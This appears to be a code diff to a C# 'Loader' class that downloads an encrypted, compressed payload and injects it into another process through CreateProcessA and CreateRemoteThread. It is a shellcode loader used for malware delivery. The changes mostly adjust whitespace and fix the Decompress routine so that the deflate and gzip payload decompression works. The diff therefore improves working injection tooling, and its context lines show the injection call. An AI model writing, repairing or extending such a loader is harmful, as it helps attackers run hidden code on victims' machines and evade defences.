@@ -44,6 +44,7 @@ public class Loader
             this.Length = Marshal.SizeOf(this);
         }
     }
+
     [StructLayout(LayoutKind.Sequential)]
     public struct ProcessInformation
     {
@@ -52,6 +53,7 @@ public class Loader
         public Int32 dwProcessId;
         public Int32 dwThreadId;
     }
+
     [Flags]
     public enum CreateProcessFlags : uint
     {
@@ -87,7 +89,6 @@ public class Loader
         CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
     }
 
-
     [StructLayout(LayoutKind.Sequential)]
     public class StartupInfo
     {
@@ -114,6 +115,7 @@ public class Loader
             this.cb = Marshal.SizeOf(this);
         }
     }
+
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
             IntPtr lpEnvironment,
@@ -155,8 +157,6 @@ public class Loader
         
         if (AESKey != null && AESIV != null)
         {
-
-
             for (int i = 16; i <= encrypted.Length - 1; i++)
             {
                 l.Add(encrypted[i]);
@@ -189,6 +189,7 @@ public class Loader
         CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
         return;
     }
+
     public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
     {
         byte[] decompressedArray = null;
@@ -200,8 +201,14 @@ public class Loader
                 {
                     using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                     {
-                        deflateStream.Write(decompressedArray, 0, compressStream.ToArray().Length);
+                        byte[] buffer = new byte[4096];
+                        int bytesRead;
+                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            decompressedStream.Write(buffer, 0, bytesRead);
+                        }
                     }
+                    decompressedArray = decompressedStream.ToArray();
                 }
             }
             return decompressedArray;
@@ -214,8 +221,14 @@ public class Loader
                 {
                     using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
                     {
-                        gzipStream.Write(decompressedArray, 0, compressStream.ToArray().Length);
+                        byte[] buffer = new byte[4096];
+                        int bytesRead;
+                        while ((bytesRead = gzipStream.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            decompressedStream.Write(buffer, 0, bytesRead);
+                        }
                     }
+                    decompressedArray = decompressedStream.ToArray();
                 }
             }
             return decompressedArray;
@@ -225,6 +238,7 @@ public class Loader
             return data;
         }
     }
+
     public static byte[] Decrypt(byte[] ciphertext, byte[] AESKey, byte[] AESIV)
     {
         byte[] key = AESKey;
@@ -248,6 +262,7 @@ public class Loader
             }
         }
     }
+
     public class WebClientWithTimeout : WebClient
     {
         protected override WebRequest GetWebRequest(Uri address)
